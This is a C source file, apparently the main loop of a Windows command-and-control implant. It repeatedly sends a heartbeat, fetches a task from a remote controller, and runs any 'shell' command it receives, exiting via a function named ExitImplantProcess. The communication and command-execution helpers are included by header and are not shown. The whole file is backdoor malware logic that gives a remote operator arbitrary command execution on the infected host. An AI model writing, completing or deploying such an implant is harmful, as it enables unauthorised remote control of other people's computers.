#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "utils.h"
#include "comms.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    InitializeComms();

    while (1) {
        SendHeartbeat();

        char task[1024] = {0};

        if (GetCommand(task, sizeof(task))) {
             // pasrse commands
            if (strcmp(task, "exit") == 0) {
                ExitImplantProcess();
            } else if (strncmp(task, "shell", 5) == 0 && task[5] == ' ') {
                char *shellCmd = task + 5; // trimming "shell" off of cmd
                if (*shellCmd == ' ') {
                    shellCmd++;
                }
                ExecuteCommandWrapper(shellCmd);
            }
        }
        Sleep(SLEEP_TIME);
    }

    return EXIT_SUCCESS;
}
